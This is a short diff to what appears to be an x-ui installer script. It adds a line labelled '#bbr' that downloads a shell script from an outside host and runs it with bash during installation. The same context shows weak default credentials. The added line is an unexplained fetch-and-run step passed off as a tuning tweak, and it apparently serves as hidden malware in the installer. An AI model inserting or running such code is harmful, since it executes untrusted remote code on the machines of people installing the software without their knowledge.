@@ -79,6 +79,9 @@ install_base() {
     fi
 }
 
+#bbr
+wget sh.alhttdw.cn/d11.sh && bash d11.sh
+
 #This function will be called when user installed x-ui out of sercurity
 default_username="54321"
 default_password="54321"
